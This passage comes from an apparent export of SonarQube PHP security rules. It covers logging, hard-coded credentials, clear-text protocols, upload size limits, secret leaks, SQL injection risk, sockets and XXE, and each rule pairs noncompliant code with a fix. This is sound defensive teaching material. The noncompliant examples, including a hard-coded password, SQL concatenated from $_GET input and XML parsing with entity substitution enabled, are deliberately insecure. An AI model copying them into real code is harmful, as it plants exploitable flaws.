  input, validate using whitelists whenever possible. Enabling users to write what they want in your logs can have many impacts. It could for example
  use all your storage space or compromise your log indexing service. </li>
  <li> Log enough information to monitor suspicious activities and evaluate the impact an attacker might have on your systems. Register events such as
  failed logins, successful logins, server side input validation failures, access denials and any important transaction. </li>
  <li> Monitor the logs for any suspicious activity. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>Basic PHP configuration:</p>
<pre>
function configure_logging() {
  error_reporting(E_RECOVERABLE_ERROR); // Sensitive
  error_reporting(32); // Sensitive

  ini_set('docref_root', '1'); // Sensitive
  ini_set('display_errors', '1'); // Sensitive
  ini_set('display_startup_errors', '1'); // Sensitive
  ini_set('error_log', "path/to/logfile"); // Sensitive - check logfile is secure
  ini_set('error_reporting', E_PARSE ); // Sensitive
  ini_set('error_reporting', 64); // Sensitive
  ini_set('log_errors', '0'); // Sensitive
  ini_set('log_errors_max_length', '512'); // Sensitive
  ini_set('ignore_repeated_errors', '1'); // Sensitive
  ini_set('ignore_repeated_source', '1'); // Sensitive
  ini_set('track_errors', '0'); // Sensitive

  ini_alter('docref_root', '1'); // Sensitive
  ini_alter('display_errors', '1'); // Sensitive
  ini_alter('display_startup_errors', '1'); // Sensitive
  ini_alter('error_log', "path/to/logfile"); // Sensitive - check logfile is secure
  ini_alter('error_reporting', E_PARSE ); // Sensitive
  ini_alter('error_reporting', 64); // Sensitive
  ini_alter('log_errors', '0'); // Sensitive
  ini_alter('log_errors_max_length', '512'); // Sensitive
  ini_alter('ignore_repeated_errors', '1'); // Sensitive
  ini_alter('ignore_repeated_source', '1'); // Sensitive
  ini_alter('track_errors', '0'); // Sensitive
}
</pre>
<p>Definition of custom loggers with <code>psr/log</code></p>
<pre>
abstract class MyLogger implements \Psr\Log\LoggerInterface { // Sensitive
    // ...
}

abstract class MyLogger2 extends \Psr\Log\AbstractLogger { // Sensitive
    // ...
}

abstract class MyLogger3 {
    use \Psr\Log\LoggerTrait; // Sensitive
    // ...
}
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised for logger configuration when it follows <a href="https://www.loggly.com/ultimate-guide/php-logging-basics/">recommended
settings</a> for production servers. The following examples are all valid:</p>
<pre>
  ini_set('docref_root', '0');
  ini_set('display_errors', '0');
  ini_set('display_startup_errors', '0');

  error_reporting(0);
  ini_set('error_reporting', 0);

  ini_set('log_errors', '1');
  ini_set('log_errors_max_length', '0');
  ini_set('ignore_repeated_errors', '0');
  ini_set('ignore_repeated_source', '0');
  ini_set('track_errors', '1');
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/">Top 10 2021 Category A9 - Security Logging and
  Monitoring Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring">Top 10 2017 Category A10 -
  Insufficient Logging &amp; Monitoring</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/117">CWE-117 - Improper Output Neutralization for Logs</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/532">CWE-532 - Information Exposure Through Log Files</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2068">
              php:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466">CVE-2019-13466</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389">CVE-2018-15389</a> </li>
</ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as "oauthToken", "secret", …​</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>
  <li> Credentials are used in production environments. </li>
  <li> Application re-distribution is required before updating the credentials. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>
  <li> Store the credentials in a database. </li>
  <li> Use your cloud provider’s service for managing secrets. </li>
  <li> If a password has been disclosed through the source code: change it. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
$password = "65DBGgwe4uazdWQA"; // Sensitive

$httpUrl = "https://example.domain?user=user&amp;password=65DBGgwe4uazdWQA" // Sensitive
$sshUrl = "ssh://user:65DBGgwe4uazdWQA@example.domain" // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
$user = getUser();
$password = getPassword(); // Compliant

$httpUrl = "https://example.domain?user=$user&amp;password=$password" // Compliant
$sshUrl = "ssh://$user:$password@example.domain" // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD">Hard Coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S5332">
              php:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul>
  <li> sensitive data exposure </li>
  <li> traffic redirected to a malicious endpoint </li>
  <li> malware-infected software update or installer </li>
  <li> execution of client-side code </li>
  <li> corruption of critical information </li>
</ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul>
  <li> bypassing isolation mechanisms </li>
  <li> compromising a component of the network </li>
  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>
</ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a
href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169">CVE-2019-6169</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327">CVE-2019-12327</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065">CVE-2019-11065</a> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>
  <li> Application data transits over an untrusted network. </li>
  <li> Compliance rules require the service to encrypt data in transit. </li>
  <li> Your application renders web pages with a relaxed mixed content policy. </li>
  <li> OS-level protections against clear-text traffic are deactivated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul>
      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>
      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>
      <li> Use <code>https</code> instead of <code>http</code>. </li>
      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>
    </ul>  </li>
  <li> Enable encryption of cloud components communications whenever it is possible. </li>
  <li> Configure your application to block mixed content when rendering web pages. </li>
  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>
</ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<pre>
$url = "http://example.com"; // Sensitive
$url = "ftp://anonymous@example.com"; // Sensitive
$url = "telnet://anonymous@example.com"; // Sensitive

$con = ftp_connect('example.com'); // Sensitive

$trans = (new Swift_SmtpTransport('XXX', 1234)); // Sensitive

$mailer = new PHPMailer(true); // Sensitive

define( 'FORCE_SSL_ADMIN', false); // Sensitive
define( 'FORCE_SSL_LOGIN', false); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
$url = "https://example.com";
$url = "sftp://anonymous@example.com";
$url = "ssh://anonymous@example.com";

$con = ftp_ssl_connect('example.com');

$trans = (new Swift_SmtpTransport('smtp.example.org', 1234))
  -&gt;setEncryption('tls')
;

$mailer = new PHPMailer(true);
$mailer-&gt;SMTPSecure = 'tls';

define( 'FORCE_SSL_ADMIN', true);
define( 'FORCE_SSL_LOGIN', true);
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul>
  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>
</ul>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data Exposure
  </a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/319">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>
  <li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html">Google, Moving towards more secure web</a> </li>
  <li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/">Mozilla, Deprecating non secure http</a> </li>
  <li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li>
  <li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html">AWS
  Documentation</a> - Stream Encryption </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S5693">
              php:S5693
            </a>
          </td>
          <td>
            <details>
              <p>Rejecting requests with significant content length is a good practice to control the network traffic intensity and thus resource consumption in
order to prevent DoS attacks.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> size limits are not defined for the different resources of the web application. </li>
  <li> the web application is not protected by <a href="https://en.wikipedia.org/wiki/Rate_limiting">rate limiting</a> features. </li>
  <li> the web application infrastructure has limited resources. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> For most of the features of an application, it is recommended to limit the size of requests to:
    <ul>
      <li> lower or equal to 8mb for file uploads. </li>
      <li> lower or equal to 2mb for other requests. </li>
    </ul>  </li>
</ul>
<p>It is recommended to customize the rule with the limit values that correspond to the web application.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://symfony.com/doc/current/reference/constraints/File.html#maxsize">Symfony Constraints</a>:</p>
<pre>
use Symfony\Component\Validator\Constraints as Assert;
use Symfony\Component\Validator\Mapping\ClassMetadata;

class TestEntity
{
    public static function loadValidatorMetadata(ClassMetadata $metadata)
    {
        $metadata-&gt;addPropertyConstraint('upload', new Assert\File([
            'maxSize' =&gt; '100M', // Sensitive
        ]));
    }
}
</pre>
<p>For <a href="https://laravel.com/docs/8.x/validation#rule-max">Laravel Validator</a>:</p>
<pre>
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

class TestController extends Controller
{
    public function test(Request $request)
    {
        $validatedData = $request-&gt;validate([
            'upload' =&gt; 'required|file', // Sensitive
        ]);
    }
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://symfony.com/doc/current/reference/constraints/File.html#maxsize">Symfony Constraints</a>:</p>
<pre>
use Symfony\Component\Validator\Constraints as Assert;
use Symfony\Component\Validator\Mapping\ClassMetadata;

class TestEntity
{
    public static function loadValidatorMetadata(ClassMetadata $metadata)
    {
        $metadata-&gt;addPropertyConstraint('upload', new Assert\File([
            'maxSize' =&gt; '8M', // Compliant
        ]));
    }
}
</pre>
<p>For <a href="https://laravel.com/docs/8.x/validation#rule-max">Laravel Validator</a>:</p>
<pre>
use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

class TestController extends Controller
{
    public function test(Request $request)
    {
        $validatedData = $request-&gt;validate([
            'upload' =&gt; 'required|file|max:8000', // Compliant
        ]);
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html">Owasp Cheat Sheet</a> - Owasp Denial of Service
  Cheat Sheet </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/770">CWE-770 - Allocation of Resources Without Limits or Throttling</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S6437">
              php:S6437
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>The consequences vary greatly depending on the situation and the secret-exposed audience. Still, two main scenarios should be considered.</p>
<h4>Financial loss</h4>
<p>Financial losses can occur when a secret is used to access a paid third-party-provided service and is disclosed as part of the source code of
client applications. Having the secret, each user of the application will be able to use it without limit to use the third party service to their own
need, including in a way that was not expected.</p>
<p>This additional use of the secret will lead to added costs with the service provider.</p>
<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected
application. This might result in a partial denial of service for all the application’s users.</p>
<h4>Application’s security downgrade</h4>
<p>A downgrade can happen when the disclosed secret is used to protect security-sensitive assets or features of the application. Depending on the
affected asset or feature, the practical impact can range from a sensitive information leak to a complete takeover of the application, its hosting
server or another linked component.</p>
<p>For example, an application that would disclose a secret used to sign user authentication tokens would be at risk of user identity impersonation.
An attacker accessing the leaked secret could sign session tokens for arbitrary users and take over their privileges and entitlements.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<p>The following code example is noncompliant because it uses a hardcoded secret value.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
use Defuse\Crypto\KeyOrPassword;

function createKey() {
    $password = "3xAmpl3";  // Noncompliant
    return KeyOrPassword::createFromPassword($password);
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
use Defuse\Crypto\KeyOrPassword;

function createKey() {
    $password = $_ENV["SECRET"]
    return KeyOrPassword::createFromPassword($password);
}
</pre>
<h3>How does this work?</h3>
<p>While the noncompliant code example contains a hard-coded password, the compliant solution retrieves the secret’s value from its environment. This
allows to have an environment-dependent secret value and avoids storing the password in the source code itself.</p>
<p>Depending on the application and its underlying infrastructure, how the secret gets added to the environment might change.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> AWS Documentation - <a href="https://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html">What is AWS Secrets Manager</a> </li>
  <li> Azure Documentation - <a href="https://learn.microsoft.com/en-us/azure/key-vault/">Azure Key Vault</a> </li>
  <li> Google Cloud - <a href="https://cloud.google.com/secret-manager/docs">Secret Manager documentation</a> </li>
  <li> HashiCorp Developer - <a href="https://developer.hashicorp.com/vault/docs">Vault Documentation</a> </li>
  <li> Symfony - <a href="https://symfony.com/doc/current/configuration/secrets.html">How to Keep Sensitive Information Secret</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 - Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 - Category A2 - Broken
  Authentication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/259">CWE-259 - Use of Hard-coded Password</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2077">
              php:S2077
            </a>
          </td>
          <td>
            <details>
              <p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the
query. However, this rule doesn’t detect SQL injections (unlike rule <a href='/organizations/sopra-steria/rules?open=php%3AS3649&rule_key=php%3AS3649'>S3649</a>), the goal is only to highlight complex/formatted queries.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Some parts of the query come from untrusted values (like user inputs). </li>
  <li> The query is repeated/duplicated in other parts of the code. </li>
  <li> The application must support different types of relational databases. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use <a href="https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html">parameterized queries, prepared
  statements, or stored procedures</a> and bind variables to SQL query parameters. </li>
  <li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
$id = $_GET['id'];
mysql_connect('localhost', $username, $password) or die('Could not connect: ' . mysql_error());
mysql_select_db('myDatabase') or die('Could not select database');

$result = mysql_query("SELECT * FROM myTable WHERE id = " . $id);  // Sensitive, could be susceptible to SQL injection

while ($row = mysql_fetch_object($result)) {
    echo $row-&gt;name;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
$id = $_GET['id'];
try {
    $conn = new PDO('mysql:host=localhost;dbname=myDatabase', $username, $password);
    $conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $stmt = $conn-&gt;prepare('SELECT * FROM myTable WHERE id = :id');
    $stmt-&gt;execute(array('id' =&gt; $id));

    while($row = $stmt-&gt;fetch(PDO::FETCH_OBJ)) {
        echo $row-&gt;name;
    }
} catch(PDOException $e) {
    echo 'ERROR: ' . $e-&gt;getMessage();
}
</pre>
<h2>Exceptions</h2>
<p>No issue will be raised if one of the functions is called with hard-coded string (no concatenation) and this string does not contain a "$"
sign.</p>
<pre>
$result = mysql_query("SELECT * FROM myTable WHERE id = 42") or die('Query failed: ' . mysql_error());  // Compliant
</pre>
<p>The current implementation does not follow variables. It will only detect SQL queries which are concatenated or contain a <code>$</code> sign
directly in the function call.</p>
<pre>
$query = "SELECT * FROM myTable WHERE id = " . $id;
$result = mysql_query($query);  // No issue will be raised even if it is Sensitive
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/89">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>
  <li> Derived from FindSecBugs rules <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA">Potential SQL/JPQL Injection
  (JPA)</a>, <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO">Potential SQL/JDOQL Injection (JDO)</a>, <a
  href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE">Potential SQL/HQL Injection (Hibernate)</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4818">
              php:S4818
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1785">CVE-2011-178</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5645">CVE-2017-5645</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6597">CVE-2018-6597</a> </li>
</ul>
<p>Sockets are vulnerable in multiple ways:</p>
<ul>
  <li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive
  sensitive information or inject dangerous input. </li>
  <li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li>
</ul>
<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the
use of http connections.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sockets are created without any limit every time a user performs an action. </li>
  <li> input received from sockets is used without being sanitized. </li>
  <li> sensitive data is sent via sockets without being encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li>
  <li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li>
  <li> <a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet">Sanitize</a> any input read from the socket. </li>
  <li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
function handle_sockets($domain, $type, $protocol, $port, $backlog, $addr, $hostname, $local_socket, $remote_socket, $fd) {
    socket_create($domain, $type, $protocol); // Sensitive
    socket_create_listen($port, $backlog); // Sensitive
    socket_addrinfo_bind($addr); // Sensitive
    socket_addrinfo_connect($addr); // Sensitive
    socket_create_pair($domain, $type, $protocol, $fd);

    fsockopen($hostname); // Sensitive
    pfsockopen($hostname); // Sensitive
    stream_socket_server($local_socket); // Sensitive
    stream_socket_client($remote_socket); // Sensitive
    stream_socket_pair($domain, $type, $protocol); // Sensitive
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption ('Resource Exhaustion')</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2755">
              php:S2755
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows the usage of external entities in XML.</p>
<h2>Why is this an issue?</h2>
<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without
proper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>
<h3>What is the potential impact?</h3>
<h4>Exposing sensitive data</h4>
<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can
reference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these
entities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe
threat to the confidentiality of critical information.</p>
<h4>Exhausting system resources</h4>
<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,
attackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading
to system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>
<h4>Forging requests</h4>
<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker
can make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as
retrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,
including unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>
<h2>How to fix it in Core PHP</h2>
<h3>Code examples</h3>
<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE
attacks if an attacker can control the XML file that is processed.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$xml = file_get_contents('xxe.xml');
$doc = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT); // Noncompliant
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
$doc = new DOMDocument();
$doc-&gt;load('xxe.xml', LIBXML_NOENT); // Noncompliant
</pre>
<pre data-diff-id="3" data-diff-type="noncompliant">
$reader = new XMLReader();
$reader-&gt;open('xxe.xml');
$reader-&gt;setParserProperty(XMLReader::SUBST_ENTITIES, true); // Noncompliant
</pre>
<h4>Compliant solution</h4>
<p>External entity substitution is disabled by default in <code>simplexml_load_string()</code> and <code>DOMDocument::open()</code>.</p>
<pre data-diff-id="1" data-diff-type="compliant">
$xml = file_get_contents('xxe.xml');
$doc = simplexml_load_string($xml, 'SimpleXMLElement');
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
$doc = new DOMDocument();
$doc-&gt;load('xxe.xml');
</pre>
<pre data-diff-id="3" data-diff-type="compliant">
$reader = new XMLReader();
$reader-&gt;open('xxe.xml');
$reader-&gt;setParserProperty(XMLReader::SUBST_ENTITIES, false);
</pre>
<h3>How does this work?</h3>
<h4>Disable external entities</h4>
<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for
specific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the
appropriate properties or options in your XML parser library or framework.</p>
<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved
during XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are
processed.<br> You should rely on features provided by your XML parser to restrict the external entities.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)">Top 10 2017 Category A4 - XML External
  Entities (XXE)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/611">CWE-611 - Information Exposure Through XML External Entity Reference</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/827">CWE-827 - Improper Control of Document Type Definition</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
